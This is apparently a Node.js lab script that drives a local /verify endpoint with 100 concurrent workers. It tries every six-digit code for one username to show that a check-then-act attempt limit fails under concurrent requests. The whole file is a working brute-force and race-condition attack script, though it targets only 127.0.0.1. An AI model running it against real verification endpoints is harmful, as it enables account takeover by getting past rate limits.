// Drives ../01-content-length-framing/server.js's /verify endpoint with
// high concurrency to probe whether its check-then-act rate limit
// (`attempts >= 5`) actually holds under concurrent callers.
// See ./README.md for what this is demonstrating and why.

import http from "node:http";
import { performance } from "node:perf_hooks";

const TOTAL_REQUESTS = 900_000;
const CONCURRENCY = 100;
const START_CANDIDATE = 100_000;
const END_CANDIDATE = 999_999;

const agent = new http.Agent({
  keepAlive: true,
  maxSockets: CONCURRENCY,
  maxFreeSockets: CONCURRENCY,
});

function request(candidate) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify({
      username:'salim',
      code:candidate,
    });

    const req = http.request(
      {
        hostname: "127.0.0.1",
        port: 3000,
        path: "/verify",
        method: "POST",
        agent,
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(body),
        },
      },
      (res) => {
        let data = "";

        res.on("data", (chunk) => {
          data += chunk;
        });

        res.on("end", () => {
          resolve({
            statusCode: res.statusCode,
            body: data,
          });
        });
      }
    );

    req.on("error", reject);

    req.write(body);
    req.end();
  });
}

async function main() {
  const start = performance.now();

  let nextJob = 0;

  async function worker() {
    while (true) {
      const job = nextJob++;

      const candidate = START_CANDIDATE + job;

      if (
        job >= TOTAL_REQUESTS ||
        candidate > END_CANDIDATE
      ) {
        return;
      }

      const response = await request(candidate);

      if (response.statusCode !== 200) {
        console.log(
          `candidate=${candidate} status=${response.statusCode}`
        );
      }
    }
  }

  try {
    await Promise.all(
      Array.from(
        { length: CONCURRENCY },
        () => worker()
      )
    );
  } finally {
    agent.destroy();
  }

  const elapsed = performance.now() - start;
  const seconds = elapsed / 1000;

  console.log(`Completed: ${TOTAL_REQUESTS}`);
  console.log(`Concurrency: ${CONCURRENCY}`);
  console.log(`Time: ${elapsed.toFixed(2)} ms`);
  console.log(
    `Throughput: ${(TOTAL_REQUESTS / seconds).toFixed(2)} req/s`
  );
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});